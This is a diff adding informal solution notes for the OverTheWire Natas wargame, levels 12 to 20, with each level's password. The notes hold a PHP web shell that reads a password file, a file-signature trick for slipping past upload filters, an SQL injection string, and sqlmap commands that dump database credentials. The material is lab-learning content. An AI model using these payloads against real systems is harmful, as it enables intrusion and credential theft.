@@ -143,5 +143,71 @@ curl "http://natas11.natas.labs.overthewire.org/" -H "Authorization: Basic `echo
 12
 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
+// the key point is changing "jpg" to "php" and then try bellow code.
 
+
+<?php $output = shell_exec('cat /etc/natas_webpass/natas13'); echo $output; ?>
+
+13
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+// https://en.wikipedia.org/wiki/List_of_file_signatures
+
+// after change 4 hex value you can get passwd.
+// another way to get passwd is making file with a image editing program, and add some php code for comment in the program.
+// befor change hex value you must put 4 more charactor in front of the code like the bellow
+
+....<?php $output = shell_exec('cat /etc/natas_webpass/natas13'); echo $output; ?>
+
+
+14
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+// put 
+natas" #
+// in the username part
+
+
+15
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+//1. type that on kali linux
+
+-u http://natas15.natas.labs.overthewire.org/index.php --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --dbms=mysql --data username=natas16 --level=5 --risk=3 --technique=B --dump --string="This user exists"
+
+// other way.. making python code. but i dont undersatnd how it works.
+
+
+
+
+16
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+// check the 16_1.py
+
+17
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  
+
+// if sleep() is executed, it means true..
+// check the code 17s
+
+// if you want to use sqlmap, see the bellow code
+
+sqlmap --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u 'http://natas17.natas.labs.overthewire.org/index.php?username=' --level 3 --dbms='MySQL 5.5' -p username --technique T --dbs
+sqlmap --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 --dbms="MySQL 5.5" -p username --technique T -D natas17 -T users -C username,password --dump
+
+18
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+// the key point is there are only 640 sessid.
+// see the codes.
+
+19
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+// the sessid value is hex encoded and when you decode the value you can find that the value is looks like 'number-name'
+
+
+20
+eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 
